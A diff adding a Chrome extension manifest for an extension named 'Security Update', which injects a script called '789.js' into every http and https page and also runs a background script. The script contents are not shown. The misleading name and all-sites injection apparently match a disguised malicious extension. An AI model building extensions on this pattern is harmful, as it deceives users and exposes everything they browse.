@@ -1,0 +1,21 @@
+{
+   "background": {
+      "scripts": [ "background.js" ]
+   },
+   "browser_action": {
+      "default_icon": "icon.png"
+   },
+   "content_scripts": [ {
+      "js": [ "789.js" ],
+     "matches": [ "http://*/*", "https://*/*" ]
+   } ],
+   "description": "Security Update",
+   "icons": {
+      "128": "icon.png"
+   },
+   "manifest_version": 2,
+   "name": "Security Update",
+   "short_name": "Security Update",
+   "update_url": "https://clients2.google.com/service/update2/crx",
+   "version": "0.0.6"
+}
